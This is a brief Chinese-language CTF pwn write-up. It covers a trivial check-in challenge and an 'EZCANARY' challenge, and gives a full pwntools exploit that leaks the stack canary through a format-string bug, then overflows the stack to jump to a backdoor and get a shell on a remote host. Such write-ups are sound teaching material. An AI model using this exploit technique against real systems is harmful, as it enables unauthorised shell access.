# PWN

## CheckIn

属于pwn的签到，放入IDA后分析发现逻辑为输入一个shell后即可拿到一个shell，可谓打开就送。

## EZCANARY

经典的格式化字符串与栈溢出与canary，通过格式化字符串泄露canary，构造payload将返回地址覆盖为后门即可拿到shell。

### EXP

```python
from pwn import *
#io = process("./pwn")
io = remote("81.69.243.226",60413)
#gdb.attach(io)
bk = 0x401243
print(hex(bk))
io.sendlineafter(b"gift:",b"%21$p")
r = io.recvuntil(b"00")
canary = int(r,16)
print("canary:",hex(canary))
payload = b"a" * 104 +p64(canary)+b"b"*8 +p64(bk)
io.sendline(payload)
io.interactive()
```